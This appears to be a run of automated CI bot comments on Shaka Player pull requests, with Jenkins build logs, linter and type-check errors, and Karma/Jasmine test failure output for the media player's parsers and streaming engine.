'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'video/webm; codecs=\"vp8\"', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: 'Starting each stream from', 0\nINFO: 'Switching stream to', {uniqueId: 672, segmentIndexSource: {subtitlesUrl_: {urls: ..., startByte: ..., endByte: ..., requestPromise_: ..., request_: ..., callback_: ..., currentUrl: ...}, segmentIndex_: {references: ..., timestampCorrection: ...}}, segmentInitSource: null, id: '19', timestampOffset: 0, bandwidth: null, width: null, height: null, mimeType: 'text/vtt', codecs: '', keyIds: [], allowedByKeySystem: true, allowedByApplication: true}\nINFO: 'Switching stream to', {uniqueId: 672, segmentIndexSource: {subtitlesUrl_: {urls: ..., startByte: ..., endByte: ..., requestPromise_: ..., request_: ..., callback_: ..., currentUrl: ...}, segmentIndex_: {references: ..., timestampCorrection: ...}}, segmentInitSource: null, id: '19', timestampOffset: 0, bandwidth: null, width: null, height: null, mimeType: 'text/vtt', codecs: '', keyIds: [], allowedByKeySystem: true, allowedByApplication: true}\nINFO: 'Switching stream to', {uniqueId: 673, segmentIndexSource: {subtitlesUrl_: {urls: ..., startByte: ..., endByte: ..., requestPromise_: ..., request_: ..., callback_: ..., currentUrl: ...}, segmentIndex_: null}, segmentInitSource: null, id: '20', timestampOffset: 0, bandwidth: null, width: null, height: null, mimeType: 'text/vtt', codecs: '', keyIds: [], allowedByKeySystem: true, allowedByApplication: true}\n.\nChrome 47.0.2526 (Linux 0.0.0): Executed 293 of 293 (2 FAILED) (3 mins 39.005 secs / 3 mins 38.902 secs)\n. Testing in progress...\n. Failure:\n+ ./build/all.py\n101 files checked, no errors found.\n+ git checkout github/master -- karma.conf.js\n+ export NODE_PATH=/usr/local/lib/node_modules\n+ NODE_PATH=/usr/local/lib/node_modules\n+ xvfb-run karma start --single-run --no-colors --reporters junit,dots --log-level disable --browsers Chrome\nChrome 49.0.2623 (Linux 0.0.0): Executed 0 of 0 ERROR (0.003 secs / 0 secs)\n. Testing in progress...\n. All tests passed!\n. Testing in progress...\n. All tests passed!\n. Testing in progress...\n. All tests passed!\n. Testing in progress...\n. All tests passed!\n. Testing in progress...\n. All tests passed!\n. Testing in progress...\n. Failure:\n```\n+ echo START-BUILD\nSTART-BUILD\n+ ./build/all.py\n156 files checked, no errors found.\nConfig loaded: \u001b[36m/var/lib/jenkins/jobs/Manual PR Test/workspace/.htmlhintrc\u001b[39m\nConfig loaded: \u001b[36m/var/lib/jenkins/jobs/Manual PR Test/workspace/.htmlhintrc\u001b[39m\nConfig loaded: \u001b[36m/var/lib/jenkins/jobs/Manual PR Test/workspace/.htmlhintrc\u001b[39m\n\u001b[32mScan 3 files, without errors (29 ms).\u001b[39m\n/var/lib/jenkins/jobs/Manual PR Test/workspace/lib/offline/storage.js:262: ERROR - Function with non-trivial return must have @return JSDoc or inline return JSDoc.\n  }.bind(this)).then(function(/* ?shakaExtern.ManifestDB / data) {\n                     ^\n/var/lib/jenkins/jobs/Manual PR Test/workspace/lib/util/public_promise.js:31: ERROR - Function with non-trivial return must have @return JSDoc or inline return JSDoc.\nshaka.util.PublicPromise = function() {\n                           ^\n/var/lib/jenkins/jobs/Manual PR Test/workspace/test/cast/cast_proxy_unit.js:647: ERROR - Function with non-trivial return must have @return JSDoc or inline return JSDoc.\n  function createMockCastSender(\n  ^\n/var/lib/jenkins/jobs/Manual PR Test/workspace/test/cast/cast_receiver_unit.js:607: ERROR - Useless empty statement. Remove semicolon.\n  };\n   ^\n/var/lib/jenkins/jobs/Manual PR Test/workspace/test/dash/dash_parser_manifest_unit.js:50: ERROR - Useless empty statement. Remove semicolon.\n    };\n     ^\n/var/lib/jenkins/jobs/Manual PR Test/workspace/test/dash/dash_parser_manifest_unit.js:64: ERROR - Useless empty statement. Remove semicolon.\n    };\n     ^\n/var/lib/jenkins/jobs/Manual PR Test/workspace/test/dash/dash_parser_manifest_unit.js:97: ERROR - Useless empty statement. Remove semicolon.\n  };\n   ^\n/var/lib/jenkins/jobs/Manual PR Test/workspace/test/media/mp4_vtt_parser_unit.js:127: ERROR - Useless empty statement. Remove semicolon.\n  };\n   ^\n/var/lib/jenkins/jobs/Manual PR Test/workspace/test/media/segment_index_unit.js:335: ERROR - Function with non-trivial return must have @return JSDoc or inline return JSDoc.\n  function uri(x) {\n  ^\n/var/lib/jenkins/jobs/Manual PR Test/workspace/test/media/streaming_engine_integration.js:266: ERROR - Useless empty statement. Remove semicolon.\n    function makeUris(uri) { return function() { return [uri]; }; };\n                                                                   ^\n/var/lib/jenkins/jobs/Manual PR Test/workspace/test/media/streaming_engine_integration.js:526: ERROR - Function with non-trivial return must have @return JSDoc or inline return JSDoc.\n  function defaultOnChooseStreams(period) {\n  ^\n/var/lib/jenkins/jobs/Manual PR Test/workspace/test/media/streaming_engine_unit.js:62: ERROR - Function with non-trivial return must have @return JSDoc or inline return JSDoc.\n  function runTest(opt_callback) {\n  ^\n/var/lib/jenkins/jobs/Manual PR Test/workspace/test/media/streaming_engine_unit.js:1947: ERROR - Function with non-trivial return must have @return JSDoc or inline return JSDoc.\n  function defaultOnChooseStreams(period) {\n  ^\n/var/lib/jenkins/jobs/Manual PR Test/workspace/test/offline/offline_integration.js:141: ERROR - Function with non-trivial return must have @return JSDoc or inline return JSDoc.\n        .then(/* @suppress {accessControls} / function() {\n                                                ^\n/var/lib/jenkins/jobs/Manual PR Test/workspace/test/player_unit.js:1270: ERROR - Function with non-trivial return must have @return JSDoc or inline return JSDoc.\n  function chooseStreams() {\n  ^\n/var/lib/jenkins/jobs/Manual PR Test/workspace/test/test/util/dash_parser_util.js:250: ERROR - Function with non-trivial return must have @return JSDoc or inline return JSDoc.\n    function makeManifestText(timeline, testAttrs, opt_dur, opt_start) {\n    ^\n/var/lib/jenkins/jobs/Manual PR Test/workspace/test/test/util/dash_parser_util.js:255: ERROR - Useless empty statement. Remove semicolon.\n    };\n     ^\n/var/lib/jenkins/jobs/Manual PR Test/workspace/test/test/util/simple_fakes.js:94: ERROR - Function with non-trivial return must have @return JSDoc or inline return JSDoc.\nshaka.test.FakeDrmEngine = function() {\n                           ^\n/var/lib/jenkins/jobs/Manual PR Test/workspace/test/test/util/simple_fakes.js:150: ERROR - Function with non-trivial return must have @return JSDoc or inline return JSDoc.\nshaka.test.FakeStreamingEngine = function(period) {\n                                 ^\n/var/lib/jenkins/jobs/Manual PR Test/workspace/third_party/closure/goog/base.js:803: ERROR - Useless empty statement. Remove semicolon.\n  function tempCtor() {};\n                        ^\n20 error(s), 0 warning(s)\nBuild failed\nGenerating Closure dependencies...\nRunning Closure linter...\nRunning htmlhint...\nChecking that the build files are complete...\nChecking the tests for type errors...\nBuild step 'Execute shell' marked build as failure\n```\n. Testing in progress...\n. Failure:\n```\n+ echo START-BUILD\nSTART-BUILD\n+ ./build/all.py\n156 files checked, no errors found.\nConfig loaded: \u001b[36m/var/lib/jenkins/jobs/Manual PR Test/workspace/.htmlhintrc\u001b[39m\nConfig loaded: \u001b[36m/var/lib/jenkins/jobs/Manual PR Test/workspace/.htmlhintrc\u001b[39m\nConfig loaded: \u001b[36m/var/lib/jenkins/jobs/Manual PR Test/workspace/.htmlhintrc\u001b[39m\n\u001b[32mScan 3 files, without errors (27 ms).\u001b[39m\n/var/lib/jenkins/jobs/Manual PR Test/workspace/test/test/util/memory_db_engine.js:52: ERROR - condition always evaluates to false\nleft : null\nright: null\n  return this.stores_ != null;\n         ^\n1 error(s), 0 warning(s), 90.6% typed\nBuild failed\nGenerating Closure dependencies...\nRunning Closure linter...\nRunning htmlhint...\nChecking that the build files are complete...\nChecking the tests for type errors...\nBuild step 'Execute shell' marked build as failure\n```\n. Testing in progress...\n. All tests passed!\n. Testing in progress...\n. All tests passed!\n. Testing in progress...\n. All tests passed!\n. Testing in progress...\n. All tests passed!\n. Testing in progress...\n. Failure:\n```\nChrome 51.0.2704 (Linux 0.0.0).Playhead clamps playhead after seeking for live FAILED\n  Error\n      at Object. (/var/lib/jenkins/jobs/Manual PR Test/workspace/test/media/playhead_unit.js:73:41)\nChrome 51.0.2704 (Linux 0.0.0).Playhead clamps playhead after seeking for VOD FAILED\n  Error\n      at Object. (/var/lib/jenkins/jobs/Manual PR Test/workspace/test/media/playhead_unit.js:73:41)\nChrome 51.0.2704 (Linux 0.0.0).Playhead clamps playhead after resuming FAILED\n  Error\n      at Object. (/var/lib/jenkins/jobs/Manual PR Test/workspace/test/media/playhead_unit.js:73:41)\nFailed 3 tests, passed 771, skipped 35\n```\n. Testing in progress...\n. All tests passed!\n. Testing in progress...\n. Failure:\n```\n+ echo START-BUILD\nSTART-BUILD\n+ ./build/all.py\n157 files checked, no errors found.\nConfig loaded: \u001b[36m/var/lib/jenkins/jobs/Manual PR Test/workspace/.htmlhintrc\u001b[39m\nConfig loaded: \u001b[36m/var/lib/jenkins/jobs/Manual PR Test/workspace/.htmlhintrc\u001b[39m\nConfig loaded: \u001b[36m/var/lib/jenkins/jobs/Manual PR Test/workspace/.htmlhintrc\u001b[39m\n\u001b[32mScan 3 files, without errors (34 ms).\u001b[39m\n/var/lib/jenkins/jobs/Manual PR Test/workspace/test/media/drm_engine_integration.js:55: ERROR - assignment to property width of HTMLVideoElement\nfound   : number\nrequired: string\n    video.width = 600;\n    ^\n/var/lib/jenkins/jobs/Manual PR Test/workspace/test/media/drm_engine_integration.js:56: ERROR - assignment to property height of HTMLVideoElement\nfound   : number\nrequired: string\n    video.height = 400;\n    ^\n/var/lib/jenkins/jobs/Manual PR Test/workspace/test/media/media_source_engine_integration.js:60: ERROR - assignment to property width of HTMLVideoElement\nfound   : number\nrequired: string\n    video.width = 600;\n    ^\n/var/lib/jenkins/jobs/Manual PR Test/workspace/test/media/media_source_engine_integration.js:61: ERROR - assignment to property height of HTMLVideoElement\nfound   : number\nrequired: string\n    video.height = 400;\n    ^\n/var/lib/jenkins/jobs/Manual PR Test/workspace/test/media/streaming_engine_integration.js:75: ERROR - assignment to property width of HTMLVideoElement\nfound   : number\nrequired: string\n    video.width = 600;\n    ^\n/var/lib/jenkins/jobs/Manual PR Test/workspace/test/media/streaming_engine_integration.js:76: ERROR - assignment to property height of HTMLVideoElement\nfound   : number\nrequired: string\n    video.height = 400;\n    ^\n/var/lib/jenkins/jobs/Manual PR Test/workspace/test/offline/offline_integration.js:28: ERROR - assignment to property width of HTMLVideoElement\nfound   : number\nrequired: string\n    video.width = 600;\n    ^\n/var/lib/jenkins/jobs/Manual PR Test/workspace/test/offline/offline_integration.js:29: ERROR - assignment to property height of HTMLVideoElement\nfound   : number\nrequired: string\n    video.height = 400;\n    ^\n/var/lib/jenkins/jobs/Manual PR Test/workspace/test/player_integration.js:36: ERROR - assignment to property width of HTMLVideoElement\nfound   : number\nrequired: string\n    video.width = 600;\n    ^\n/var/lib/jenkins/jobs/Manual PR Test/workspace/test/player_integration.js:37: ERROR - assignment to property height of HTMLVideoElement\nfound   : number\nrequired: string\n    video.height = 400;\n    ^\n10 error(s), 0 warning(s), 90.4% typed\nBuild failed\nGenerating Closure dependencies...\nRunning Closure linter...\nRunning htmlhint...\nChecking that the build files are complete...\nChecking the tests for type errors...\nBuild step 'Execute shell' marked build as failure\n```\n. Testing in progress...\n. All tests passed!\n. Testing in progress...\n. All tests passed!\n. Testing in progress...\n. All tests passed!\n. Testing in progress...\n. All tests passed!\n. Testing in progress...\n. All tests passed!\n. Testing in progress...\n. All tests passed!\n. Testing in progress...\n. All tests passed!\n. Testing in progress...\n. All tests passed!\n. Testing in progress...\n. Failure:\n+ echo START-BUILD\nSTART-BUILD\n+ ./build/all.py\n----- FILE  :  /var/lib/jenkins/jobs/Manual PR Test/workspace/test/media/vtt_text_parser_unit.js -----\nLine 326, E:0110: Line too long (84 characters).\nFound 1 errors, including 0 new errors, in 1 files (161 files OK).\nGenerating Closure dependencies...\nRunning Closure linter...\nBuild step 'Execute shell' marked build as failure\n. Testing in progress...\n. All tests passed!\n. Testing in progress...\n. Failure:\n```\nChrome 53.0.2785 (Linux 0.0.0).DrmEngine getDrmInfo includes correct info FAILED\n  Expected Object({ keySystem: 'drm.abc', licenseServerUri: 'http://abc.drm/license', distinctiveIdentifierRequired: true, persistentStateRequired: true, audioRobustness: 'good', videoRobustness: 'really_really_ridiculously_good', serverCertificate: undefined, initData: [  ], keyIds: [  ] }) to equal Object({ keySystem: 'drm.abc', licenseServerUri: 'http://abc.drm/license', distinctiveIdentifierRequired: true, persistentStateRequired: true, audioRobustness: 'good', videoRobustness: 'really_really_ridiculously_good', serverCertificate: undefined, initData: [  ] }).\n      at test/media/drm_engine_unit.js:1455:25\n      at wrapper (lib/polyfill/promise.js:333:21)\n      at Function.shaka.polyfill.Promise.flush (lib/polyfill/promise.js:440:11)\n      at test/test/util/util.js:76:32\nFailed 1 tests, passed 890, skipped 36\n```\n. Testing in progress...\n. Failure:\n+ echo START-BUILD\nSTART-BUILD\n+ ./build/all.py\n----- FILE  :  /var/lib/jenkins/jobs/Manual PR Test/workspace/test/media/drm_engine_unit.js -----\nLine 1444, E:0110: Line too long (99 characters).\nFound 1 errors, including 0 new errors, in 1 files (161 files OK).\nGenerating Closure dependencies...\nRunning Closure linter...\nBuild step 'Execute shell' marked build as failure\n. Testing in progress...\n. All tests passed!\n. Testing in progress...\n. All tests passed!\n. Testing in progress...\n. Testing in progress...\n. Failure:\n```\nChrome 54.0.2840 (Linux 0.0.0).Player configure checks the number of arguments to functions FAILED\n  Expected spy shaka.log.warning not to have been called.\n      at Object. (test/player_unit.js:544:30)\nChrome 54.0.2840 (Linux 0.0.0).Player configure checks the number of arguments to functions FAILED\n  Expected spy shaka.log.warning not to have been called.\n      at Object. (test/player_unit.js:576:30)\nFailed 2 tests, passed 897, skipped 37\n```\n. Testing in progress...\n. All tests passed!\n. Testing in progress...\n. All tests passed!\n. Testing in progress...\n. All tests passed!\n. Testing in progress...\n. All tests passed!\n. Testing in progress...\n. All tests passed!\n. Testing in progress...\n. Failure:\n+ echo START-BUILD\nSTART-BUILD\n+ ./build/all.py\n----- FILE  :  /var/lib/jenkins/jobs/Manual PR Test/workspace/test/abr/simple_abr_manager_unit.js -----\nLine 203, E:0006: Wrong indentation: expected any of {6} but got 10\nLine 204, E:0006: Wrong indentation: expected any of {6} but got 10\nLine 205, E:0006: Wrong indentation: expected any of {4} but got 8\nFound 3 errors, including 3 new errors, in 1 files (161 files OK).\nGenerating Closure dependencies...\nRunning Closure linter...\nBuild step 'Execute shell' marked build as failure\n. Testing in progress...\n. All tests passed!\n. Testing in progress.... Failure:\n```\nChrome_55_0_2883_(Linux_0_0_0).StreamingEngine StreamingEngine VOD plays FAILED\n  Error: Timeout - Async callback was not invoked within timeout specified by jasmine.DEFAULT_TIMEOUT_INTERVAL.\nChrome_55_0_2883_(Linux_0_0_0).StreamingEngine StreamingEngine VOD plays at high playback rates FAILED\n  Error: Timeout - Async callback was not invoked within timeout specified by jasmine.DEFAULT_TIMEOUT_INTERVAL.\nChrome_55_0_2883_(Linux_0_0_0).StreamingEngine StreamingEngine VOD can handle buffered seeks FAILED\n  Error: Timeout - Async callback was not invoked within timeout specified by jasmine.DEFAULT_TIMEOUT_INTERVAL.\nChrome_55_0_2883_(Linux_0_0_0).StreamingEngine StreamingEngine VOD can handle unbuffered seeks FAILED\n  Error: Timeout - Async callback was not invoked within timeout specified by jasmine.DEFAULT_TIMEOUT_INTERVAL.\nChrome_55_0_2883_(Linux_0_0_0).StreamingEngine StreamingEngine Live plays through Period transition FAILED\n  Error: Timeout - Async callback was not invoked within timeout specified by jasmine.DEFAULT_TIMEOUT_INTERVAL.\nChrome_55_0_2883_(Linux_0_0_0).StreamingEngine StreamingEngine Live can handle seeks ahead of availability window FAILED\n  Error: Timeout - Async callback was not invoked within timeout specified by jasmine.DEFAULT_TIMEOUT_INTERVAL.\nChrome_55_0_2883_(Linux_0_0_0).StreamingEngine StreamingEngine Live can handle seeks behind availability window FAILED\n  Error: Timeout - Async callback was not invoked within timeout specified by jasmine.DEFAULT_TIMEOUT_INTERVAL.\nFailed 7 tests, passed 902, skipped 37\n. Whoops!  Trying again with a rebase.... Sorry about that.  Looks good!  All tests passed after rebasing.. Testing in progress...\n. All tests passed!\n. Testing in progress...\n. All tests passed!\n. Testing in progress.... Testing in progress.... Failure:\nChrome_55_0_2883_(Linux_0_0_0).StreamingEngine StreamingEngine VOD plays FAILED\n  Error: Timeout - Async callback was not invoked within timeout specified by jasmine.DEFAULT_TIMEOUT_INTERVAL.\nChrome_55_0_2883_(Linux_0_0_0).StreamingEngine StreamingEngine VOD plays at high playback rates FAILED\n  Error: Timeout - Async callback was not invoked within timeout specified by jasmine.DEFAULT_TIMEOUT_INTERVAL.\nChrome_55_0_2883_(Linux_0_0_0).StreamingEngine StreamingEngine VOD can handle buffered seeks FAILED\n  Error: Timeout - Async callback was not invoked within timeout specified by jasmine.DEFAULT_TIMEOUT_INTERVAL.\nChrome_55_0_2883_(Linux_0_0_0).StreamingEngine StreamingEngine VOD can handle unbuffered seeks FAILED\n  Error: Timeout - Async callback was not invoked within timeout specified by jasmine.DEFAULT_TIMEOUT_INTERVAL.\nChrome_55_0_2883_(Linux_0_0_0).StreamingEngine StreamingEngine Live plays through Period transition FAILED\n  Error: Timeout - Async callback was not invoked within timeout specified by jasmine.DEFAULT_TIMEOUT_INTERVAL.\nChrome_55_0_2883_(Linux_0_0_0).StreamingEngine StreamingEngine Live can handle seeks ahead of availability window FAILED\n  Error: Timeout - Async callback was not invoked within timeout specified by jasmine.DEFAULT_TIMEOUT_INTERVAL.\nChrome_55_0_2883_(Linux_0_0_0).StreamingEngine StreamingEngine Live can handle seeks behind availability window FAILED\n  Error: Timeout - Async callback was not invoked within timeout specified by jasmine.DEFAULT_TIMEOUT_INTERVAL.\nFailed 7 tests, passed 891, skipped 37\n. Failure:\nChrome_55_0_2883_(Linux_0_0_0).StreamingEngine StreamingEngine VOD plays FAILED\n  Error: Timeout - Async callback was not invoked within timeout specified by jasmine.DEFAULT_TIMEOUT_INTERVAL.\nChrome_55_0_2883_(Linux_0_0_0).StreamingEngine StreamingEngine VOD plays at high playback rates FAILED\n  Error: Timeout - Async callback was not invoked within timeout specified by jasmine.DEFAULT_TIMEOUT_INTERVAL.\nChrome_55_0_2883_(Linux_0_0_0).StreamingEngine StreamingEngine VOD can handle buffered seeks FAILED\n  Error: Timeout - Async callback was not invoked within timeout specified by jasmine.DEFAULT_TIMEOUT_INTERVAL.\nChrome_55_0_2883_(Linux_0_0_0).StreamingEngine StreamingEngine VOD can handle unbuffered seeks FAILED\n  Error: Timeout - Async callback was not invoked within timeout specified by jasmine.DEFAULT_TIMEOUT_INTERVAL.\nChrome_55_0_2883_(Linux_0_0_0).StreamingEngine StreamingEngine Live plays through Period transition FAILED\n  Error: Timeout - Async callback was not invoked within timeout specified by jasmine.DEFAULT_TIMEOUT_INTERVAL.\nChrome_55_0_2883_(Linux_0_0_0).StreamingEngine StreamingEngine Live can handle seeks ahead of availability window FAILED\n  Error: Timeout - Async callback was not invoked within timeout specified by jasmine.DEFAULT_TIMEOUT_INTERVAL.\nChrome_55_0_2883_(Linux_0_0_0).StreamingEngine StreamingEngine Live can handle seeks behind availability window FAILED\n  Error: Timeout - Async callback was not invoked within timeout specified by jasmine.DEFAULT_TIMEOUT_INTERVAL.\nFailed 7 tests, passed 891, skipped 37\n```\n. Test failures overridden.\nI've got no strings to hold me down, to make me smile, to make me frown!  I've got no strings, as you can see.  There are no strings on me!. Test failures overridden.\nI've got no strings to hold me down, to make me smile, to make me frown!  I've got no strings, as you can see.  There are no strings on me!. Testing in progress.... All tests passed!. Failure:\n```\nChrome_55_0_2883_(Linux_0_0_0).VttTextParser VttTextParser supports align setting FAILED\n  Expected 'middle' to be 'center'.\n      at verifyHelper (test/media/vtt_text_parser_unit.js:456:33)\n      at Object. (test/media/vtt_text_parser_unit.js:267:5)\nChrome_55_0_2883_(Linux_0_0_0).VttTextParser VttTextParser supports multiple settings FAILED\n  Expected 'middle' to be 'center'.\n      at verifyHelper (test/media/vtt_text_parser_unit.js:456:33)\n      at Object. (test/media/vtt_text_parser_unit.js:277:5)\nChrome_55_0_2883_(Linux_0_0_0).VttTextParser VttTextParser supports timestamps with one-digit hour at start time FAILED\n  Expected 'middle' to be 'center'.\n      at verifyHelper (test/media/vtt_text_parser_unit.js:456:33)\n      at Object. (test/media/vtt_text_parser_unit.js:294:5)\nChrome_55_0_2883_(Linux_0_0_0).VttTextParser VttTextParser supports timestamps with one-digit hour at end time FAILED\n  Expected 'middle' to be 'center'.\n      at verifyHelper (test/media/vtt_text_parser_unit.js:456:33)\n      at Object. (test/media/vtt_text_parser_unit.js:311:5)\nChrome_55_0_2883_(Linux_0_0_0).VttTextParser VttTextParser supports stamps with one-digit hours at start & end time FAILED\n  Expected 'middle' to be 'center'.\n      at verifyHelper (test/media/vtt_text_parser_unit.js:456:33)\n      at Object. (test/media/vtt_text_parser_unit.js:328:5)\nChrome_55_0_2883_(Linux_0_0_0).VttTextParser VttTextParser uses relative timestamps if configured to FAILED\n  Expected 'middle' to be 'center'.\n      at verifyHelper (test/media/vtt_text_parser_unit.js:456:33)\n      at Object. (test/media/vtt_text_parser_unit.js:345:5)\nFailed 6 tests, passed 947, skipped 41\n. Testing in progress.... All tests passed!. Testing in progress.... All tests passed!. Testing in progress.... All tests passed!. Testing in progress.... Failure:\n+ echo START-BUILD\nSTART-BUILD\n+ ./build/all.py\n175 files checked, no errors found.\nConfig loaded: /var/lib/jenkins/jobs/Manual PR Test (local-tests)/workspace/.htmlhintrc\nConfig loaded: /var/lib/jenkins/jobs/Manual PR Test (local-tests)/workspace/.htmlhintrc\nConfig loaded: /var/lib/jenkins/jobs/Manual PR Test (local-tests)/workspace/.htmlhintrc\nScanned 3 files, no errors found (23 ms).\n/var/lib/jenkins/jobs/Manual PR Test (local-tests)/workspace/demo/asset_section.js:203: ERROR - variable MediaMetadata is undeclared\n      navigator.mediaSession.metadata = new MediaMetadata();\n                                            ^\n1 error(s), 0 warning(s)\nBuild failed\nGenerating Closure dependencies...\nRunning Closure linter...\nRunning htmlhint...\nChecking that the build files are complete...\nChecking the tests for type errors...\nBuild step 'Execute shell' marked build as failure\n. Testing in progress.... All tests passed!. Testing in progress.... All tests passed!. Testing in progress.... All tests passed!. Testing in progress.... All tests passed!. Testing in progress.... All tests passed!. Testing in progress.... All tests passed!. All tests passed!. All tests passed!. Test Failure:\nChrome_58_0_3029_(Linux_0_0_0).TtmlTextParser TtmlTextParser supports no cues Failed\n  Expected false to be true.\n      at Object. (test/media/ttml_text_parser_unit.js:38:19)\nFailed 1 tests, passed 24, skipped 1175\n. Test Failure:\nNo tests were run\n. Test Failure:\nGenerating Closure dependencies...\nRunning Closure linter...\n184 files checked, no errors found.\nnpm WARN deprecated minimatch@2.0.10: Please update to minimatch 3.0.2 or higher to avoid a RegExp DoS issue\nnpm WARN deprecated minimatch@0.3.0: Please update to minimatch 3.0.2 or higher to avoid a RegExp DoS issue\nnpm WARN deprecated tough-cookie@2.2.2: ReDoS vulnerability parsing Set-Cookie https://nodesecurity.io/advisories/130\nnpm WARN deprecated node-uuid@1.4.8: Use uuid module instead\nnpm WARN optional SKIPPING OPTIONAL DEPENDENCY: fsevents@^1.0.0 (node_modules/chokidar/node_modules/fsevents):\nnpm WARN notsup SKIPPING OPTIONAL DEPENDENCY: Unsupported platform for fsevents@1.1.1: wanted {\"os\":\"darwin\",\"arch\":\"any\"} (current: {\"os\":\"linux\",\"arch\":\"x64\"})\nRunning htmlhint...\nConfig loaded: /var/lib/jenkins/jobs/Test Manual PR Test (local-tests)/workspace/.htmlhintrc\nConfig loaded: /var/lib/jenkins/jobs/Test Manual PR Test (local-tests)/workspace/.htmlhintrc\nConfig loaded: /var/lib/jenkins/jobs/Test Manual PR Test (local-tests)/workspace/.htmlhintrc\nScanned 3 files, no errors found (43 ms).\nChecking that the build files are complete...\nChecking the tests for type errors...\n/var/lib/jenkins/jobs/Test Manual PR Test (local-tests)/workspace/test/media/ttml_text_parser_unit.js:39: ERROR - Function VTTCue: called with 0 argument(s). Function requires at least 3 argument(s) and no more than 3 argument(s).\nnew VTTCue();\n^^^^^^^^^^^^\n1 error(s), 0 warning(s), 90.9% typed\nBuild failed\nBuild step 'Execute shell' marked build as failure\n. All tests passed!. Test Failure:\nChrome 58.0.3029 (Linux 0.0.0)\n  HlsParser parses video only variant FAILED\n    Expected $.presentationTimeline = ({ presentationStartTime_: null, presentationDelay_: 0, duration_: 5, segmentAvailabilityDuration_: Infinity, maxSegmentDuration_: 5, clockOffset_: 0, static_: true }) to equal .\n    Expected $.periods[0].startTime = 0 to equal .\n    Expected $.periods[0].variants[0].id = 2 to equal .\n    Expected $.periods[0].variants[0].video to have properties\n        label: null\n        at test/hls/hls_parser_unit.js:61:49\n        at \nHlsParser parses audio and video variant FAILED\n    Expected $.presentationTimeline = ({ presentationStartTime_: null, presentationDelay_: 0, duration_: 5, segmentAvailabilityDuration_: Infinity, maxSegmentDuration_: 5, clockOffset_: 0, static_: true }) to equal .\n    Expected $.periods[0].startTime = 0 to equal .\n    Expected $.periods[0].variants[0].id = 3 to equal .\n    Expected $.periods[0].variants[0].audio to have properties\n        label: null\n    Expected $.periods[0].variants[0].video to have properties\n        label: null\n        at test/hls/hls_parser_unit.js:61:49\n        at \nHlsParser parses multiple variants FAILED\n    Expected $.presentationTimeline = ({ presentationStartTime_: null, presentationDelay_: 0, duration_: 5, segmentAvailabilityDuration_: Infinity, maxSegmentDuration_: 5, clockOffset_: 0, static_: true }) to equal .\n    Expected $.periods[0].startTime = 0 to equal .\n    Expected $.periods[0].variants[0].id = 5 to equal .\n    Expected $.periods[0].variants[0].audio to have properties\n        label: null\n    Expected $.periods[0].variants[0].video to have properties\n        label: null\n    Expected $.periods[0].variants[1].id = 6 to equal .\n    Expected $.periods[0].variants[1].audio to have properties\n        label: null\n    Expected $.periods[0].variants[1].video to have properties\n        label: null\n        at test/hls/hls_parser_unit.js:61:49\n        at \nHlsParser parses multiple streams with the same group id FAILED\n    Expected $.presentationTimeline = ({ presentationStartTime_: null, presentationDelay_: 0, duration_: 5, segmentAvailabilityDuration_: Infinity, maxSegmentDuration_: 5, clockOffset_: 0, static_: true }) to equal .\n    Expected $.periods[0].startTime = 0 to equal .\n    Expected $.periods[0].variants[0].id = 4 to equal .\n    Expected $.periods[0].variants[0].audio to have properties\n        label: null\n    Expected $.periods[0].variants[0].video to have properties\n        label: null\n    Expected $.periods[0].variants[1].id = 5 to equal .\n    Expected $.periods[0].variants[1].audio to have properties\n        label: null\n        at test/hls/hls_parser_unit.js:61:49\n        at \nHlsParser gets mime type from header request FAILED\n    Expected $.presentationTimeline = ({ presentationStartTime_: null, presentationDelay_: 0, duration_: 5, segmentAvailabilityDuration_: Infinity, maxSegmentDuration_: 5, clockOffset_: 0, static_: true }) to equal .\n    Expected $.periods[0].startTime = 0 to equal .\n    Expected $.periods[0].variants[0].id = 2 to equal .\n    Expected $.periods[0].variants[0].video to have properties\n        label: null\n        at test/hls/hls_parser_unit.js:61:49\n        at \nHlsParser parses manifest with text streams FAILED\n    Expected $.presentationTimeline = ({ presentationStartTime_: null, presentationDelay_: 0, duration_: 5, segmentAvailabilityDuration_: Infinity, maxSegmentDuration_: 5, clockOffset_: 0, static_: true }) to equal .\n    Expected $.periods[0].startTime = 0 to equal .\n    Expected $.periods[0].variants[0].id = 5 to equal .\n    Expected $.periods[0].variants[0].audio to have properties\n        label: null\n    Expected $.periods[0].variants[0].video to have properties\n        label: null\n    Expected $.periods[0].textStreams[0] to have properties\n        label: null\n    Expected $.periods[0].textStreams[1] to have properties\n        label: null\n        at test/hls/hls_parser_unit.js:61:49\n        at \nHlsParser respects config.hls.defaultTimeOffset setting FAILED\n    Expected $.presentationTimeline = ({ presentationStartTime_: null, presentationDelay_: 0, duration_: 5, segmentAvailabilityDuration_: Infinity, maxSegmentDuration_: 5, clockOffset_: 0, static_: true }) to equal .\n    Expected $.periods[0].startTime = 0 to equal .\n    Expected $.periods[0].variants[0].id = 2 to equal .\n    Expected $.periods[0].variants[0].video to have properties\n        label: null\n        at test/hls/hls_parser_unit.js:61:49\n        at \nHlsParser parses video described by a media tag FAILED\n    Expected $.presentationTimeline = ({ presentationStartTime_: null, presentationDelay_: 0, duration_: 5, segmentAvailabilityDuration_: Infinity, maxSegmentDuration_: 5, clockOffset_: 0, static_: true }) to equal .\n    Expected $.periods[0].startTime = 0 to equal .\n    Expected $.periods[0].variants[0].id = 3 to equal .\n    Expected $.periods[0].variants[0].audio to have properties\n        label: null\n    Expected $.periods[0].variants[0].video to have properties\n        label: null\n        at test/hls/hls_parser_unit.js:61:49\n        at \nHlsParser constructs relative URIs FAILED\n    Expected $.presentationTimeline = ({ presentationStartTime_: null, presentationDelay_: 0, duration_: 5, segmentAvailabilityDuration_: Infinity, maxSegmentDuration_: 5, clockOffset_: 0, static_: true }) to equal .\n    Expected $.periods[0].startTime = 0 to equal .\n    Expected $.periods[0].variants[0].id = 3 to equal .\n    Expected $.periods[0].variants[0].audio to have properties\n        label: null\n    Expected $.periods[0].variants[0].video to have properties\n        label: null\n        at test/hls/hls_parser_unit.js:485:26\n        at \nHlsParser allows streams with no init segment FAILED\n    Expected $.presentationTimeline = ({ presentationStartTime_: null, presentationDelay_: 0, duration_: 5, segmentAvailabilityDuration_: 